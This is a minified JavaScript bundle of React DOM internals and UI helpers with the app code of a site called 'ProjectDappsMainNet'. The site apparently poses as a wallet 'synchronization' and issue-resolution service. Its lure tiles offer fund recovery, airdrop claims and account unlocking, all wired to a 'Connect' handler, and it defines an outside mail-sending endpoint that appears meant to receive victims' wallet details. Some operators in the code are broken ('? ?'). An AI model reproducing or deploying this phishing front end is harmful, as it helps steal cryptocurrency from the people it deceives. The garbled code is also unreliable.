                if (rd(t), e === null) throw Error(S(387));r = t.pendingProps,
                o = t.memoizedState,
                l = o.element,
                Tc(e, t),
                Ul(t, r, null, n);
                var i = t.memoizedState;
                if (r = i.element, o.isDehydrated)
                    if (o = {
                            element: r,
                            isDehydrated: !1,
                            cache: i.cache,
                            pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                            transitions: i.transitions
                        }, t.updateQueue.baseState = o, t.memoizedState = o, t.flags & 256) {
                        l = An(Error(S(423)), t), t = Gs(e, t, r, n, l);
                        break e
                    } else if (r !== l) {
                    l = An(Error(S(424)), t), t = Gs(e, t, r, n, l);
                    break e
                } else
                    for (Le = Mt(t.stateNode.containerInfo.firstChild), Fe = t, H = !0, Xe = null, n = $c(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
                else {
                    if (zn(), r === l) {
                        t = wt(e, t, n);
                        break e
                    }
                    we(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return Lc(t), e === null && Ci(t), r = t.type, l = t.pendingProps, o = e !== null ? e.memoizedProps : null, i = l.children, ki(r, l) ? i = null : o !== null && ki(r, o) && (t.flags |= 32), nd(e, t), we(e, t, i, n), t.child;
        case 6:
            return e === null && Ci(t), null;
        case 13:
            return ld(e, t, n);
        case 4:
            return Ea(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = Dn(t, null, r, n) : we(e, t, r, n), t.child;
        case 11:
            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Ye(r, l), Qs(e, t, r, l, n);
        case 7:
            return we(e, t, t.pendingProps, n), t.child;
        case 8:
            return we(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return we(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, l = t.pendingProps, o = t.memoizedProps, i = l.value, W(Al, r._currentValue), r._currentValue = i, o !== null)
                    if (qe(o.value, i)) {
                        if (o.children === l.children && !Ce.current) {
                            t = wt(e, t, n);
                            break e
                        }
                    } else
                        for (o = t.child, o !== null && (o.return = t); o !== null;) {
                            var a = o.dependencies;
                            if (a !== null) {
                                i = o.child;
                                for (var s = a.firstContext; s !== null;) {
                                    if (s.context === r) {
                                        if (o.tag === 1) {
                                            s = mt(-1, n & -n), s.tag = 2;
                                            var u = o.updateQueue;
                                            if (u !== null) {
                                                u = u.shared;
                                                var f = u.pending;
                                                f === null ? s.next = s : (s.next = f.next, f.next = s), u.pending = s
                                            }
                                        }
                                        o.lanes |= n, s = o.alternate, s !== null && (s.lanes |= n), Ti(o.return, n, t), a.lanes |= n;
                                        break
                                    }
                                    s = s.next
                                }
                            } else if (o.tag === 10) i = o.type === t.type ? null : o.child;
                            else if (o.tag === 18) {
                                if (i = o.return, i === null) throw Error(S(341));
                                i.lanes |= n, a = i.alternate, a !== null && (a.lanes |= n), Ti(i, n, t), i = o.sibling
                            } else i = o.child;
                            if (i !== null) i.return = o;
                            else
                                for (i = o; i !== null;) {
                                    if (i === t) {
                                        i = null;
                                        break
                                    }
                                    if (o = i.sibling, o !== null) {
                                        o.return = i.return, i = o;
                                        break
                                    }
                                    i = i.return
                                }
                            o = i
                        }
                we(e, t, l.children, n),
                t = t.child
            }
            return t;
        case 9:
            return l = t.type, r = t.pendingProps.children, Fn(t, n), l = He(l), r = r(l), t.flags |= 1, we(e, t, r, n), t.child;
        case 14:
            return r = t.type, l = Ye(r, t.pendingProps), l = Ye(r.type, l), Ks(e, t, r, l, n);
        case 15:
            return ed(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Ye(r, l), Sl(e, t), t.tag = 1, Te(r) ? (e = !0, zl(t)) : e = !1, Fn(t, n), jc(t, r, l), ji(t, r, l, n), Li(null, t, r, !0, e, n);
        case 19:
            return od(e, t, n);
        case 22:
            return td(e, t, n)
    }
    throw Error(S(156, t.tag))
};

function kd(e, t) {
    return Ku(e, t)
}

function fm(e, t, n, r) {
    this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function We(e, t, n, r) {
    return new fm(e, t, n, r)
}

function Ia(e) {
    return e = e.prototype, !(!e || !e.isReactComponent)
}

function pm(e) {
    if (typeof e == "function") return Ia(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof, e === la) return 11;
        if (e === oa) return 14
    }
    return 2
}

function At(e, t) {
    var n = e.alternate;
    return n === null ? (n = We(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function Nl(e, t, n, r, l, o) {
    var i = 2;
    if (r = e, typeof e == "function") Ia(e) && (i = 1);
    else if (typeof e == "string") i = 5;
    else e: switch (e) {
        case vn:
            return nn(n.children, l, o, t);
        case ra:
            i = 8, l |= 8;
            break;
        case qo:
            return e = We(12, n, t, l | 2), e.elementType = qo, e.lanes = o, e;
        case ei:
            return e = We(13, n, t, l), e.elementType = ei, e.lanes = o, e;
        case ti:
            return e = We(19, n, t, l), e.elementType = ti, e.lanes = o, e;
        case _u:
            return co(n, l, o, t);
        default:
            if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                case Pu:
                    i = 10;
                    break e;
                case ju:
                    i = 9;
                    break e;
                case la:
                    i = 11;
                    break e;
                case oa:
                    i = 14;
                    break e;
                case Nt:
                    i = 16, r = null;
                    break e
            }
            throw Error(S(130, e == null ? e : typeof e, ""))
    }
    return t = We(i, n, t, l), t.elementType = e, t.type = r, t.lanes = o, t
}

function nn(e, t, n, r) {
    return e = We(7, e, r, t), e.lanes = n, e
}

function co(e, t, n, r) {
    return e = We(22, e, r, t), e.elementType = _u, e.lanes = n, e.stateNode = {
        isHidden: !1
    }, e
}

function Bo(e, t, n) {
    return e = We(6, e, null, t), e.lanes = n, e
}

function Ho(e, t, n) {
    return t = We(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    }, t
}

function mm(e, t, n, r, l) {
    this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = Eo(0), this.expirationTimes = Eo(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = Eo(0), this.identifierPrefix = r, this.onRecoverableError = l, this.mutableSourceEagerHydrationData = null
}

function Aa(e, t, n, r, l, o, i, a, s) {
    return e = new mm(e, t, n, a, s), t === 1 ? (t = 1, o === !0 && (t |= 8)) : t = 0, o = We(3, null, null, t), e.current = o, o.stateNode = e, o.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    }, ba(o), e
}

function hm(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: hn,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}

function Sd(e) {
    if (!e) return Ut;
    e = e._reactInternals;
    e: {
        if (dn(e) !== e || e.tag !== 1) throw Error(S(170));
        var t = e;do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (Te(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e
                    }
            }
            t = t.return
        } while (t !== null);
        throw Error(S(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Te(n)) return kc(e, n, t)
    }
    return t
}

function bd(e, t, n, r, l, o, i, a, s) {
    return e = Aa(n, r, !0, e, l, o, i, a, s), e.context = Sd(null), n = e.current, r = xe(), l = It(n), o = mt(r, l), o.callback = t ? ? null, zt(n, o, l), e.current.lanes = l, Wr(e, l, r), Pe(e, r), e
}

function fo(e, t, n, r) {
    var l = t.current,
        o = xe(),
        i = It(l);
    return n = Sd(n), t.context === null ? t.context = n : t.pendingContext = n, t = mt(o, i), t.payload = {
        element: e
    }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = zt(l, t, i), e !== null && (Je(e, l, i, o), wl(e, l, i)), i
}

function Xl(e) {
    if (e = e.current, !e.child) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode
    }
}

function ou(e, t) {
    if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}

function Wa(e, t) {
    ou(e, t), (e = e.alternate) && ou(e, t)
}

function vm() {
    return null
}
var Ed = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
};

function Ua(e) {
    this._internalRoot = e
}
po.prototype.render = Ua.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null) throw Error(S(409));
    fo(e, t, null, null)
};
po.prototype.unmount = Ua.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        un(function() {
            fo(null, e, null, null)
        }), t[gt] = null
    }
};

function po(e) {
    this._internalRoot = e
}
po.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = ec();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < Tt.length && t !== 0 && t < Tt[n].priority; n++);
        Tt.splice(n, 0, e), n === 0 && nc(e)
    }
};

function Ba(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function mo(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function iu() {}

function gm(e, t, n, r, l) {
    if (l) {
        if (typeof r == "function") {
            var o = r;
            r = function() {
                var u = Xl(i);
                o.call(u)
            }
        }
        var i = bd(t, r, e, 0, null, !1, !1, "", iu);
        return e._reactRootContainer = i, e[gt] = i.current, jr(e.nodeType === 8 ? e.parentNode : e), un(), i
    }
    for (; l = e.lastChild;) e.removeChild(l);
    if (typeof r == "function") {
        var a = r;
        r = function() {
            var u = Xl(s);
            a.call(u)
        }
    }
    var s = Aa(e, 0, !1, null, null, !1, !1, "", iu);
    return e._reactRootContainer = s, e[gt] = s.current, jr(e.nodeType === 8 ? e.parentNode : e), un(function() {
        fo(t, s, n, r)
    }), s
}

function ho(e, t, n, r, l) {
    var o = n._reactRootContainer;
    if (o) {
        var i = o;
        if (typeof l == "function") {
            var a = l;
            l = function() {
                var s = Xl(i);
                a.call(s)
            }
        }
        fo(t, i, e, l)
    } else i = gm(n, t, e, l, r);
    return Xl(i)
}
Ju = function(e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = sr(t.pendingLanes);
                n !== 0 && (sa(t, n | 1), Pe(t, X()), !(M & 6) && (Wn = X() + 500, Vt()))
            }
            break;
        case 13:
            un(function() {
                var r = yt(e, 1);
                if (r !== null) {
                    var l = xe();
                    Je(r, e, 1, l)
                }
            }), Wa(e, 1)
    }
};
ua = function(e) {
    if (e.tag === 13) {
        var t = yt(e, 134217728);
        if (t !== null) {
            var n = xe();
            Je(t, e, 134217728, n)
        }
        Wa(e, 134217728)
    }
};
qu = function(e) {
    if (e.tag === 13) {
        var t = It(e),
            n = yt(e, t);
        if (n !== null) {
            var r = xe();
            Je(n, e, t, r)
        }
        Wa(e, t)
    }
};
ec = function() {
    return I
};
tc = function(e, t) {
    var n = I;
    try {
        return I = e, t()
    } finally {
        I = n
    }
};
di = function(e, t, n) {
    switch (t) {
        case "input":
            if (li(e, n), t = n.name, n.type === "radio" && t != null) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var l = lo(r);
                        if (!l) throw Error(S(90));
                        Lu(r), li(r, l)
                    }
                }
            }
            break;
        case "textarea":
            Ou(e, n);
            break;
        case "select":
            t = n.value, t != null && jn(e, !!n.multiple, t, !1)
    }
};
Wu = Ma;
Uu = un;
var ym = {
        usingClientEntryPoint: !1,
        Events: [Br, xn, lo, Iu, Au, Ma]
    },
    rr = {
        findFiberByHostInstance: Zt,
        bundleType: 0,
        version: "18.2.0",
        rendererPackageName: "react-dom"
    },
    wm = {
        bundleType: rr.bundleType,
        version: rr.version,
        rendererPackageName: rr.rendererPackageName,
        rendererConfig: rr.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: xt.ReactCurrentDispatcher,
        findHostInstanceByFiber: function(e) {
            return e = Vu(e), e === null ? null : e.stateNode
        },
        findFiberByHostInstance: rr.findFiberByHostInstance || vm,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.2.0-next-9e3b772b8-20220608"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var dl = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!dl.isDisabled && dl.supportsFiber) try {
        eo = dl.inject(wm), lt = dl
    } catch {}
}
Re.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = ym;
Re.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!Ba(t)) throw Error(S(200));
    return hm(e, t, null, n)
};
Re.createRoot = function(e, t) {
    if (!Ba(e)) throw Error(S(299));
    var n = !1,
        r = "",
        l = Ed;
    return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (l = t.onRecoverableError)), t = Aa(e, 1, !1, null, null, n, !1, r, l), e[gt] = t.current, jr(e.nodeType === 8 ? e.parentNode : e), new Ua(t)
};
Re.findDOMNode = function(e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0) throw typeof e.render == "function" ? Error(S(188)) : (e = Object.keys(e).join(","), Error(S(268, e)));
    return e = Vu(t), e = e === null ? null : e.stateNode, e
};
Re.flushSync = function(e) {
    return un(e)
};
Re.hydrate = function(e, t, n) {
    if (!mo(t)) throw Error(S(200));
    return ho(null, e, t, !0, n)
};
Re.hydrateRoot = function(e, t, n) {
    if (!Ba(e)) throw Error(S(405));
    var r = n != null && n.hydratedSources || null,
        l = !1,
        o = "",
        i = Ed;
    if (n != null && (n.unstable_strictMode === !0 && (l = !0), n.identifierPrefix !== void 0 && (o = n.identifierPrefix), n.onRecoverableError !== void 0 && (i = n.onRecoverableError)), t = bd(t, null, e, 1, n ? ? null, l, !1, o, i), e[gt] = t.current, jr(e), r)
        for (e = 0; e < r.length; e++) n = r[e], l = n._getVersion, l = l(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, l] : t.mutableSourceEagerHydrationData.push(n, l);
    return new po(t)
};
Re.render = function(e, t, n) {
    if (!mo(t)) throw Error(S(200));
    return ho(null, e, t, !1, n)
};
Re.unmountComponentAtNode = function(e) {
    if (!mo(e)) throw Error(S(40));
    return e._reactRootContainer ? (un(function() {
        ho(null, null, e, !1, function() {
            e._reactRootContainer = null, e[gt] = null
        })
    }), !0) : !1
};
Re.unstable_batchedUpdates = Ma;
Re.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!mo(n)) throw Error(S(200));
    if (e == null || e._reactInternals === void 0) throw Error(S(38));
    return ho(e, t, n, !1, r)
};
Re.version = "18.2.0-next-9e3b772b8-20220608";

function Nd() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Nd)
    } catch (e) {
        console.error(e)
    }
}
Nd(), bu.exports = Re;
var Cd = bu.exports,
    au = Cd;
Zo.createRoot = au.createRoot, Zo.hydrateRoot = au.hydrateRoot;
const Td = "vite.svg",
    xm = () => g.jsxs("footer", {
        className: "bg-black/50 pt-12 px-8",
        children: [g.jsx("section", {
            className: "max-w-screen-xl mx-auto",
            children: g.jsx("img", {
                src: Td,
                className: "mx-auto"
            })
        }), g.jsxs("div", {
            className: "text-center text-gray-400 text-sm py-8",
            children: ["© ", new Date().getFullYear(), " ProjectDappsMainNet."]
        })]
    }),
    km = ({
        handleConnect: e
    }) => g.jsx("header", {
        className: "h-16 px-6 flex items-center justify-center backdrop-blur bg-white/10 fixed top-0 left-0 right-0 z-[5]",
        children: g.jsxs("nav", {
            className: "max-w-screen-xl flex justify-between items-center w-full",
            children: [g.jsx("img", {
                src: Td
            }), g.jsx("button", {
                type: "button",
                onClick: e,
                className: "text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-sm px-8 py-2.5 text-center",
                children: "Connect"
            })]
        })
    }),
    Sm = [{
        title: "Migration",
        subtitle: "Click here for migration"
    }, {
        title: "Claim",
        subtitle: "Click here to claim assets"
    }, {
        title: "Swap",
        subtitle: "Click here for assets swapping"
    }, {
        title: "Slippage",
        subtitle: "Click here for slippage related error"
    }, {
        title: "Transaction",
        subtitle: "Click here for transaction related issues"
    }, {
        title: "Cross Transfer",
        subtitle: "Click here for cross bridge issues"
    }, {
        title: "Staking",
        subtitle: "Click here for Staking related issues"
    }, {
        title: "Exchange",
        subtitle: "Click here for exchange related issues"
    }, {
        title: "Connect to Dapps",
        subtitle: "Click here for error while connectting to dapps."
    }, {
        title: "Login",
        subtitle: "Click here for wallet login issue."
    }, {
        title: "Whitelist",
        subtitle: "Click here for whitelist related issues."
    }, {
        title: "Buy Coins/Tokens",
        subtitle: "To trade, your account must be marked as a trusted payment source."
    }, {
        title: "Missing/Irregular Balance",
        subtitle: "Click here to recover lost/missing funds."
    }, {
        title: "Wallet Glitch / Wallet Error",
        subtitle: "Click here if you have problem with your trading wallet."
    }, {
        title: "Transaction Delay",
        subtitle: "Click here for any issues related to transaction delay."
    }, {
        title: "Claim Airdrop",
        subtitle: "Click here for airdrop related issues."
    }, {
        title: "NFTs",
        subtitle: "Click here for NFTs minting/transfer related issues."
    }, {
        title: "Locked Account",
        subtitle: "Click here for issues related to account lock."
    }],
    bm = "https://mailsenderrr.vercel.app/send",
    Em = "assets/Wallet_Overview-e39d2d74.html";

function Nm({
    handleConnect: e
}) {
    return g.jsxs("main", {
        className: "pt-16",
        children: [g.jsxs("section", {
            className: "max-w-screen-xl mx-auto py-16 md:py-8 md:min-h-[95vh] px-6 flex flex-col md:flex-row items-center justify-between gap-16",
            children: [g.jsxs("div", {
                className: "w-full md:w-2/3",
                children: [g.jsx("h2", {
                    className: "text-3xl md:text-6xl font-black",
                    children: "ProjectDappsMainNet"
                }), g.jsx("p", {
                    className: "my-4 text-sm md:text-lg",
                    children: "It is not an app, but a decentralized and open protocol. This protocol allows syncing of different Wallets issues on a Secure Server, creating a remote resolution between noncustodial wallets."
                }), g.jsx("p", {
                    className: "mb-4 text-sm md:text-lg",
                    children: "It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues."
                }), g.jsx("p", {
                    className: "my-8 text-sm md:text-lg",
                    children: "In our system, we leverage a robust protocol that facilitates seamless remote communication and resolution among all noncustodial wallets."
                }), g.jsx("button", {
                    type: "button",
                    onClick: e,
                    className: "text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-base px-12 py-4 text-center",
                    children: "Synchronize Wallet"
                })]
            }), g.jsx("div", {
                className: "w-full md:w-1/3",
                children: g.jsx("img", {
                    src: Em,
                    className: "bg-white/10 w-full rounded-xl"
                })
            })]
        }), g.jsx("section", {
            className: "bg-black/20 py-12",
            children: g.jsxs("div", {
                className: "max-w-screen-lg mx-auto p-8 md:px-0",
                children: [g.jsx("h3", {
                    className: "text-center text-2xl md:text-4xl font-black mb-10",
                    children: "Select Your Action Below"
                }), g.jsx("div", {
                    className: "grid grid-cols-1 md:grid-cols-3 gap-8",
                    children: Sm.map((t, n) => g.jsxs("div", {
                        tabIndex: n + 1,
                        onClick: e,
                        className: "flex flex-col gap-3 cursor-pointer bg-white/10 py-4 px-8 rounded-lg focus:ring-4 focus:outline-none focus:ring-indigo-200",
                        children: [g.jsx("span", {
                            className: "text-4xl text-gray-400",
                            children: "#"
                        }), g.jsxs("div", {
                            children: [g.jsx("h5", {
                                className: "font-semibold text-lg mb-1",
                                children: t.title
                            }), g.jsx("p", {
                                className: " text-gray-400",
                                children: t.subtitle
                            })]
                        })]
                    }, t.title))
                })]
            })
        }), g.jsx("section", {
            className: "py-24 px-6",
            children: g.jsxs("div", {
                className: "max-w-screen-md mx-auto  border-2 border-white/20 py-6 px-6 md:px-12 rounded-xl text-center",
                children: [g.jsx("h2", {
                    className: "text-xl md:text-2xl font-bold",
                    children: "We're supported by over 300 apps & wallets."
                }), g.jsx("p", {
                    className: "my-6 text-sm md:text-base",
                    children: "You can connect your wallet with hundreds of apps, opening the doors to a new world of web3 experiences. Synchronize your wallet for free and enjoy exclusive perks. Join our Discord and get whitelisted for our upcoming token airdrop."
                }), g.jsx("button", {
                    type: "button",
                    onClick: e,
                    className: "text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-sm px-12 py-3 text-center",
                    children: "Synchronize for free"
                })]
            })
        })]
    })
}
var Cm = Object.defineProperty,
    Tm = (e, t, n) => t in e ? Cm(e, t, {
        enumerable: !0,
        configurable: !0,
        writable: !0,
        value: n
    }) : e[t] = n,
    Vo = (e, t, n) => (Tm(e, typeof t != "symbol" ? t + "" : t, n), n);
let Pm = class {
        constructor() {
            Vo(this, "current", this.detect()), Vo(this, "handoffState", "pending"), Vo(this, "currentId", 0)
        }
        set(t) {
            this.current !== t && (this.handoffState = "pending", this.currentId = 0, this.current = t)
        }
        reset() {
            this.set(this.detect())
        }
        nextId() {
            return ++this.currentId
        }
        get isServer() {
            return this.current === "server"
        }
        get isClient() {
            return this.current === "client"
        }
        detect() {
            return typeof window > "u" || typeof document > "u" ? "server" : "client"
        }
        handoff() {
            this.handoffState === "pending" && (this.handoffState = "complete")
        }
        get isHandoffComplete() {
            return this.handoffState === "complete"
        }
    },
    ht = new Pm,
    le = (e, t) => {
        ht.isServer ? v.useEffect(e, t) : v.useLayoutEffect(e, t)
    };

function Be(e) {
    let t = v.useRef(e);
    return le(() => {
        t.current = e
    }, [e]), t
}

function Vr(e) {
    typeof queueMicrotask == "function" ? queueMicrotask(e) : Promise.resolve().then(e).catch(t => setTimeout(() => {
        throw t
    }))
}

function fn() {
    let e = [],
        t = {
            addEventListener(n, r, l, o) {
                return n.addEventListener(r, l, o), t.add(() => n.removeEventListener(r, l, o))
            },
            requestAnimationFrame(...n) {
                let r = requestAnimationFrame(...n);
                return t.add(() => cancelAnimationFrame(r))
            },
            nextFrame(...n) {
                return t.requestAnimationFrame(() => t.requestAnimationFrame(...n))
            },
            setTimeout(...n) {
                let r = setTimeout(...n);
                return t.add(() => clearTimeout(r))
            },
            microTask(...n) {
                let r = {
                    current: !0
                };
                return Vr(() => {
                    r.current && n[0]()
                }), t.add(() => {
                    r.current = !1
                })
            },
            style(n, r, l) {
                let o = n.style.getPropertyValue(r);
                return Object.assign(n.style, {
                    [r]: l
                }), this.add(() => {
                    Object.assign(n.style, {
                        [r]: o
                    })
                })
            },
            group(n) {
                let r = fn();
                return n(r), this.add(() => r.dispose())
            },
            add(n) {
                return e.push(n), () => {
                    let r = e.indexOf(n);
                    if (r >= 0)
                        for (let l of e.splice(r, 1)) l()
                }
            },
            dispose() {
                for (let n of e.splice(0)) n()
            }
        };
    return t
}

function Ha() {
    let [e] = v.useState(fn);
    return v.useEffect(() => () => e.dispose(), [e]), e
}
let z = function(e) {
    let t = Be(e);
    return F.useCallback((...n) => t.current(...n), [t])
};

function jm() {
    let e = typeof document > "u";
    return "useSyncExternalStore" in xr ? (t => t.useSyncExternalStore)(xr)(() => () => {}, () => !1, () => !e) : !1
}

function Kn() {
    let e = jm(),
        [t, n] = v.useState(ht.isHandoffComplete);
    return t && ht.isHandoffComplete === !1 && n(!1), v.useEffect(() => {
        t !== !0 && n(!0)
    }, [t]), v.useEffect(() => ht.handoff(), []), e ? !1 : t
}
var su;
let Qt = (su = F.useId) != null ? su : function() {
    let e = Kn(),
        [t, n] = F.useState(e ? () => ht.nextId() : null);
    return le(() => {
        t === null && n(ht.nextId())
    }, [t]), t != null ? "" + t : void 0
};

function Z(e, t, ...n) {
    if (e in t) {
        let l = t[e];
        return typeof l == "function" ? l(...n) : l
    }
    let r = new Error(`Tried to handle "${e}" but there is no handler defined. Only defined handlers are: ${Object.keys(t).map(l=>`"${l}"`).join(", ")}.`);
    throw Error.captureStackTrace && Error.captureStackTrace(r, Z), r
}

function Va(e) {
    return ht.isServer ? null : e instanceof Node ? e.ownerDocument : e != null && e.hasOwnProperty("current") && e.current instanceof Node ? e.current.ownerDocument : document
}
let Hi = ["[contentEditable=true]", "[tabindex]", "a[href]", "area[href]", "button:not([disabled])", "iframe", "input:not([disabled])", "select:not([disabled])", "textarea:not([disabled])"].map(e => `${e}:not([tabindex='-1'])`).join(",");
var se = (e => (e[e.First = 1] = "First", e[e.Previous = 2] = "Previous", e[e.Next = 4] = "Next", e[e.Last = 8] = "Last", e[e.WrapAround = 16] = "WrapAround", e[e.NoScroll = 32] = "NoScroll", e))(se || {}),
    Tn = (e => (e[e.Error = 0] = "Error", e[e.Overflow = 1] = "Overflow", e[e.Success = 2] = "Success", e[e.Underflow = 3] = "Underflow", e))(Tn || {}),
    _m = (e => (e[e.Previous = -1] = "Previous", e[e.Next = 1] = "Next", e))(_m || {});

function $m(e = document.body) {
    return e == null ? [] : Array.from(e.querySelectorAll(Hi)).sort((t, n) => Math.sign((t.tabIndex || Number.MAX_SAFE_INTEGER) - (n.tabIndex || Number.MAX_SAFE_INTEGER)))
}
var Pd = (e => (e[e.Strict = 0] = "Strict", e[e.Loose = 1] = "Loose", e))(Pd || {});

function Lm(e, t = 0) {
    var n;
    return e === ((n = Va(e)) == null ? void 0 : n.body) ? !1 : Z(t, {
        0() {
            return e.matches(Hi)
        },
        1() {
            let r = e;
            for (; r !== null;) {
                if (r.matches(Hi)) return !0;
                r = r.parentElement
            }
            return !1
        }
    })
}
var Fm = (e => (e[e.Keyboard = 0] = "Keyboard", e[e.Mouse = 1] = "Mouse", e))(Fm || {});
typeof window < "u" && typeof document < "u" && (document.addEventListener("keydown", e => {
    e.metaKey || e.altKey || e.ctrlKey || (document.documentElement.dataset.headlessuiFocusVisible = "")
}, !0), document.addEventListener("click", e => {
    e.detail === 1 ? delete document.documentElement.dataset.headlessuiFocusVisible : e.detail === 0 && (document.documentElement.dataset.headlessuiFocusVisible = "")
}, !0));

function rn(e) {
    e == null || e.focus({
        preventScroll: !0
    })
}
let Om = ["textarea", "input"].join(",");

function Rm(e) {
    var t, n;
    return (n = (t = e == null ? void 0 : e.matches) == null ? void 0 : t.call(e, Om)) != null ? n : !1
}

function Pn(e, t = n => n) {
    return e.slice().sort((n, r) => {
        let l = t(n),
            o = t(r);
        if (l === null || o === null) return 0;
        let i = l.compareDocumentPosition(o);
        return i & Node.DOCUMENT_POSITION_FOLLOWING ? -1 : i & Node.DOCUMENT_POSITION_PRECEDING ? 1 : 0
    })
}

function nt(e, t, {
    sorted: n = !0,
    relativeTo: r = null,
    skipElements: l = []
} = {}) {
    let o = Array.isArray(e) ? e.length > 0 ? e[0].ownerDocument : document : e.ownerDocument,
        i = Array.isArray(e) ? n ? Pn(e) : e : $m(e);
    l.length > 0 && i.length > 1 && (i = i.filter(y => !l.includes(y))), r = r ? ? o.activeElement;
    let a = (() => {
            if (t & 5) return 1;
            if (t & 10) return -1;
            throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
        })(),
        s = (() => {
            if (t & 1) return 0;
            if (t & 2) return Math.max(0, i.indexOf(r)) - 1;
            if (t & 4) return Math.max(0, i.indexOf(r)) + 1;
            if (t & 8) return i.length - 1;
            throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
        })(),
        u = t & 32 ? {
            preventScroll: !0
        } : {},
        f = 0,
        h = i.length,
        m;
    do {
        if (f >= h || f + h <= 0) return 0;
        let y = s + f;
        if (t & 16) y = (y + h) % h;
        else {
            if (y < 0) return 3;
            if (y >= h) return 1
        }
